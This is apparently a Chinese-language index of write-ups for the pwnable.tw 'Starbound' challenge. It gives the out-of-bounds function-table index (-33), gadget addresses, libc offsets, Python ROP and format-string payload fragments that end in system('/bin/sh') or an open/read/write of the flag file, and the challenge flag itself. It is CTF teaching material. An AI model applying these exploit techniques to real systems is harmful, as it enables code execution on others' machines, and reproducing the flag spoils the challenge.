---
tags:
  - integer-overflow
  - stack-pivoting
  - rop
platform: pwnable.tw
points: 200
arch: i386
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "菜单跳转表接受负下标，可读到表外，进而把栈迁移到用户输入上执行 ROP 链。"
proof-of-concept: no
---

# Starbound — pwnable.tw（200 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10202`
>
> Flag：`FLAG{st4r_st4r_st4r_b0und}`

## 题目概况

一款"星界边境"风格的太空游戏（i386，No PIE、Partial RELRO、NX、无 canary），链接 glibc 2.23。玩家通过 1–7 的主菜单交互，操作包括探索、战斗、背包、地图、设置、多人等。设置菜单可以修改玩家名字和 IP 地址。主分发逻辑用 `strtol` 解析菜单选项，并把它当作下标去索引一个**函数指针表**，而且**完全没有边界检查**。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## 关键内存布局（无 PIE —— 地址固定）

| 地址 | 内容 |
|---------|---------|
| `0x08057F80` | `me` 结构体（全局玩家状态） |
| `0x080580C8` | `me.ip` —— IP 地址缓冲区 |
| `0x080580D0` | `me.name` —— 玩家名字缓冲区（4+ 字节） |
| `0x08058154` | 函数指针表（`cmds[]`）—— 对应菜单 1–7 的 7 个表项 |
| `0x0805509C` | `puts@GOT` |
| `0x08055050` | `__libc_start_main@GOT` |
| `0x08055054` | `read@GOT` |

位于 `0x08058154` 的函数指针表处于 `me` 结构体的**尾部**。位于 `0x080580D0` 的名字缓冲区相对表基址偏移 `-0x84`（即 -33 个 dword）。

## 漏洞

### V1 — 函数指针表越界索引（主要，可 Exploit）

**根因：** 主菜单分发用 `strtol()` 读入选项，并直接拿它当函数指针表的下标，**不做边界检查**：

```asm
; main dispatch (0x0804A65D)
call    strtol          ; eax = user choice (signed)
call    DWORD PTR [eax*4 + 0x8058154]  ; NO bounds check on eax
```

由于 `eax` 可以是**任意有符号整数**（包括负数），攻击者可以让程序把内存中**任意 4 字节对齐的 dword** 当作函数指针调用。

**关键下标：** 下标 **-33** 会让分发从 `0x08058154 + (-33)*4 = 0x080580D0` 读取 —— 也就是**玩家名字缓冲区**。而名字是玩家通过设置菜单自己写的，于是程序会调用一个**攻击者控制的地址**。

```text
cmds[-33] = *(0x080580D0) = name[0:4]
```

**影响：** 任意代码执行 —— 玩家名字的前 4 个字节会被当作函数指针调用。

### V2 — 大负下标泄漏栈（可 Exploit）

**根因：** 用一个足够大的负下标（例如 `-3118`），函数表查找就会落进栈区域。由于输入缓冲区本身也在栈上，`puts` 或菜单系统的输出可以泄漏**栈地址**。

```python
# -3118 index leaks a stack pointer through puts output
io.send("-3118")
stack_leak = u32(io.recv(4))
```

**影响：** 泄漏栈地址，可用于精确的栈迁移或 ROP 链布置。

### V3 — 经 `do_bye` gadget 打格式化字符串（可 Exploit）

**根因：** 把名字设成 `do_bye()` 内部某个函数中间地址 `0x08049C16`，分发就会落在这里：

```asm
; 0x08049C16 (inside do_bye)
mov     [esp], 1
call    __printf_chk    ; __printf_chk(1, input_buffer)
```

这就把**用户输入缓冲区**变成了 `__printf_chk` 的格式化字符串参数。

**影响：** 一个完全受控、且**会正常返回**的格式化字符串。只要把返回地址（例如 `MAIN_LOOP = 0x0804A664`）嵌在输入缓冲区里，再用带内嵌 GOT 指针的 `%s`，就能实现一次能干净返回主循环的任意读。

### V4 — 名字缓冲区溢出到设置结构体（助攻）

名字读取函数（`readn`）按固定字节数读取。位于 `0x080580D0` 的名字缓冲区处于更大的 `me` 结构体内部，写过界会覆盖结构体的其他字段，不过主要用途只是放下那 4 字节函数指针。

## 利用路径

所有解法都利用 V1（函数指针表越界）：把玩家名字设成受控值，然后输入下标 `-33`（或算好的负下标）去调用它。区别在于迁移/泄漏/拿 shell 的策略。

---

### 路径 A — 栈迁移 → ROP → 泄漏 libc → `system("/bin/sh")`

**使用范围：** 解法 100、184、1172、1290、1297、1303、1316、1351、1395、14605、18331 等众多解法

**主流做法（约占 80%）。**

1. **设置名字**为栈迁移 gadget（例如 `0x08048e48` 处的 `add esp, 0x1c; ret`，或 `0x0804a171` 处的 `add esp, 0x10; pop; pop; pop; ret`）。

2. **发送 `-33` + padding + ROP 链**作为菜单输入。分发调用 `name[0:4]` 时，迁移 gadget 把 `esp` 调整到攻击者控制的输入缓冲区里，正好落在 ROP 链上。

3. **ROP 第一段 —— 泄漏 libc：**
   ```python
   # Typical ROP: puts(GOT_entry) → return to main
   rop = p32(puts_plt) + p32(main) + p32(puts_got)
   ```
   泄漏一个已解析的 libc 地址（通常是 `puts`、`read` 或 `__libc_start_main`）。

4. **ROP 第二段 —— shell：**
   已知 libc 基址后重新进入 main：
   ```python
   rop = p32(system) + p32(0xdeadbeef) + p32(binsh_addr)
   ```
   调用 `system("/bin/sh")`。

**常用栈迁移 gadget：**

| 地址 | Gadget | 效果 |
|---------|--------|--------|
| `0x08048e48` | `add esp, 0x1c; ret` | 跳过输入里的 7 个 dword |
| `0x0804a171` | `add esp, 0x10; pop; pop; pop; ret` | 跳过 7 个 dword |
| `0x0804997E` | `add esp, 0x1c; ret`（备用） | 跳过 7 个 dword |
| `0x080498e8` | `add esp, 0x88; pop; pop; ret` | 大幅跳跃 |
| `0x0804b36d` | `popal; ret` | 从栈上弹出全部寄存器 |
| `0x0804a5fe` | `add esp, 0x20; pop; pop; pop; ret` | 跳过 8 个 dword |

**常用 ROP gadget：**

| 地址 | Gadget |
|---------|--------|
| `0x08048939` | `pop ebx; ret` |
| `0x080499ef` | `pop esi; ret` |
| `0x080494da` | `pop ebx; pop esi; pop edi; ret` |
| `0x080491ba` | `pop ebx; pop esi; pop edi; pop ebp; ret` |
| `0x08048c58` | `leave; ret` |
| `0x080491bc` | `pop ebp; ret` |

---

### 路径 B — 格式化字符串泄漏 → one-gadget 拿 shell

**使用范围：** exp.py（本仓库的 exploit）

1. **设置名字** = `p32(0x08049C16)`（`do_bye` 内部的函数中间 gadget）。

2. **把格式化字符串载荷作为 `-33` 的输入发送：**
   ```python
   fmt = b"-33|" + p32(PUTS_GOT) + p32(MAIN_LOOP) + b"%p%p%p%p" + b"MARK" + b"%s"
   ```
   - `strtol("-33|...")` → 下标 -33 → 调用 `do_bye` gadget
   - gadget 调用 `__printf_chk(1, input_buffer)` —— 即格式化字符串
   - `%p%p%p%p` 消耗掉第 1–4 个可变参数，随后 `%s` 解引用 `PUTS_GOT` → **泄漏 libc**
   - 输入里第 8 字节处的 `MAIN_LOOP` 充当 gadget 那条 `add esp; ret` 的返回地址

3. **设置名字** = `p32(libc_base + one_gadget)`。

4. **发送 `-33` 加全 NUL 输入** → 调用 `one_gadget` → shell。

**优点：** 不需要多段 ROP，载荷更简单。**约束：** one-gadget 要求 `[esp+0x2c]==NULL`。

---

### 路径 C — open/read/write 读 flag（不需要 libc）

**使用范围：** 解法 138、174、185、1727、16991

1. **设置名字** = 迁移 gadget + `"/home/starbound/flag\0"`。

2. **ROP 链**只用二进制自带的 PLT 桩（不碰 libc）：
   ```python
   rop  = p32(open_plt)  + p32(pppr) + p32(flag_str_addr) + p32(0) + p32(0)
   rop += p32(read_plt)  + p32(pppr) + p32(3) + p32(bss_buf) + p32(0x100)
   rop += p32(write_plt) + p32(pppr) + p32(1) + p32(bss_buf) + p32(0x100)
   ```
   打开 flag 文件，把内容读进 BSS，再写回 stdout。

**优点：** 确定性 —— 不需要泄漏 libc，也不依赖 ASLR，一发即中。

---

### 路径 D — 泄漏栈指针 → 算出下标 → 直接调用

**使用范围：** 解法 1763、18324、10840

1. **泄漏栈地址**：用一个很大的负下标（例如 `-3118`，或 `puts@GOT` 对应的下标），让输出里带上栈数据。

2. **算出准确下标**，使函数表查找正好落在**栈上的攻击者输入**处，那里放的是目标函数地址。

3. **直接调用**栈上的载荷（例如在输入里放 `system` 的地址）。

**变体（18324）：** 用下标 `-10` 发送超长输入，同时泄漏栈和 libc；随后算出指向输入缓冲区本身的下标（那里放着 `system`），并在输入末尾附上 `;/bin/sh\0` —— 因为同一段输入既当 `strtol` 的参数，又当 `system` 的参数。

---

### 路径 E — 覆盖 GOT → `strtol` → `system`

**使用范围：** 解法 1316

1. 用 ROP（puts 的 GOT 表项）泄漏 libc。
2. **用 `read` 把 `strtol@GOT` 覆盖为 `system`**。
3. **发送 `/bin/sh\0`** 作为下一次菜单输入 → `strtol("/bin/sh")` 变成 `system("/bin/sh")`。

---

### 路径 F — syscall ROP（不用 libc，也不用 `system`）

**使用范围：** 解法 1324

1. 从 GOT **泄漏 `read` 地址**，算出 `read + 0x1c` 处的 `int 0x80` 系统调用 gadget。
2. **用 `xchg eax, ebx` / `xchg eax, ecx` / `xchg eax, edx` gadget** 布置寄存器，准备 `execve("/bin/sh", NULL, NULL)`（系统调用号 11）。
3. **设置名字** = 迁移 gadget + `"/bin/sh\0"`。
4. 用 `read` **把 `exit@GOT` 覆盖为 `int 0x80` 的地址**，然后调 `exit@PLT` → 触发 `execve`。

**优点：** 完全不需要知道 libc 版本。

---

### 路径 G — `system(" -33;/bin/sh")`（极简）

**使用范围：** 解法 18324（更简单的变体）

1. **设置名字** = `p32(puts_plt)`，下标 `-33` → 用 `puts(input_buffer)` 泄漏 libc。
2. **设置名字** = `p32(system)`。
3. **发送 ` -33;/bin/sh\0`** —— `strtol` 解析出 `-33`（前导空格被忽略），分发到 `system`，而 `system` 收到完整字符串 ` -33;/bin/sh`，在分号之后执行 `/bin/sh`。

**优点：** 极其优雅 —— 同一段输入既是分发触发条件，又是 shell 命令。

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| 任意函数调用 | V1：下标 -33 取 name[0:4] | 确定性 |
| 把栈迁到输入缓冲区 | V1 + 名字里的 gadget | 确定性 |
| 经 puts/write ROP 泄漏 libc | 栈迁移 + 读 GOT | 确定性 |
| 经格式化字符串泄漏 libc | V3：`do_bye` 函数中间 gadget | 确定性 |
| 栈地址泄漏 | V2：大负下标 | 确定性 |
| 读 flag（不需要 libc） | 只用 PLT 桩的 ROP | 确定性 |
| 代码执行 | `system`/one-gadget/`execve` 系统调用 | 确定性 |

## 偏移（远端 libc：Ubuntu GLIBC 2.23-0ubuntu10，i386）

```python
puts              = 0x5fca0
__libc_start_main = 0x18540
system            = 0x3ada0
read              = 0xd5980
"/bin/sh"         = 0x15b82b
one_gadget        = 0x3ac5e   # execve("/bin/sh", esp+0x2c, environ)
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `100.md` | A | 栈迁移 → `puts` 泄漏 → 覆盖 `read` GOT → `system` | 两段 ROP |
| `138.md` | C | 栈迁移 → ORW 读 flag | Ruby；不需要 libc |
| `174.md` | C | `add esp, 0x1c` 迁移 → open/read/write 读 flag | 极简干净 |
| `184.md` | A | `add esp, 0x28` 迁移 → 泄漏 `__libc_start_main` → `system` | 经 `leave;ret` 迁到 BSS |
| `185.md` | C | `popal;ret` 迁移 → open/read/write 读 flag | 用 `popal` gadget |
| `1006.md` | A | 栈迁移 → `puts` 泄漏 → 重入 main → `system` | 两段式，把 `/bin/bash` 写进名字 |
| `1172.md` | A | `add esp, 0x1c` → `puts` 泄漏 → 覆盖 `strtol` GOT → `system` | |
| `1290.md` | A | `puts` 泄漏 → 覆盖 `read` GOT → 用 `puts("/bin/sh")` 当 system | |
| `1297.md` | A | 用 `pop esi;ret` → `call esi` 的 gadget 链 | 调用约定思路独特 |
| `1303.md` | E | `puts` 泄漏 → 用 `read` 覆盖 `strtol@GOT` → `system` | GOT 覆盖 |
| `1316.md` | E | 用 DynELF 解析 `system` → 覆盖 GOT | 最复杂；用了 DynELF |
| `1324.md` | F | 泄漏 `read` → 算出 `int 0x80` → `execve` 系统调用 ROP | 不需要 libc 版本 |
| `1351.md` | A | `puts` 泄漏 → 经 `leave;ret` 迁到 BSS → `system` | |
| `1395.md` | A | `write` 泄漏 → 两段 ROP → `system("/bin/sh")` | |
| `1727.md` | C | `add esp, 0x1c` 迁移 → ORW 读 flag | 名字里放了明确的 flag 路径 |
| `1763.md` | D | 经 `-3118` 下标泄漏栈 → 算下标 → `system` | 爆破栈地址 |
| `1803.md` | A | Ruby；`add esp, 0x88` 迁移 → `puts` 泄漏 → `system` | |
| `10840.md` | D | 泄漏栈 → 算出指向输入的下标 → `system` | |
| `13019.md` | A | `add esp, 0x1c` 迁移 → `puts` 泄漏 → syscall `execve` | 用 `xchg` gadget 布置寄存器 |
| `14605.md` | A | `add esp, 0x1c` 迁移 → `puts` 泄漏 → `system` | 干净的两段式 |
| `16991.md` | C | `popal;ret` → open/read/write 读 flag | 不需要 libc |
| `17704.md` | A | ret2libc（先试过 ret2dlresolve） | |
| `18324.md` | D+G | 经 `-10` 泄漏栈+libc → `system(" -33;/bin/sh")` | 巧妙的分号技巧 |
| `18331.md` | A | LibcSearcher → `puts` 泄漏 → `system` | |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用 exploit（路径 B：格式化字符串泄漏 → one-gadget） |
| `desc.txt` | 题目描述 |
| `artifacts/starbound` | 原始题目二进制（i386，stripped） |
| `solution/*.md` | 社区 writeup（120 份解法） |
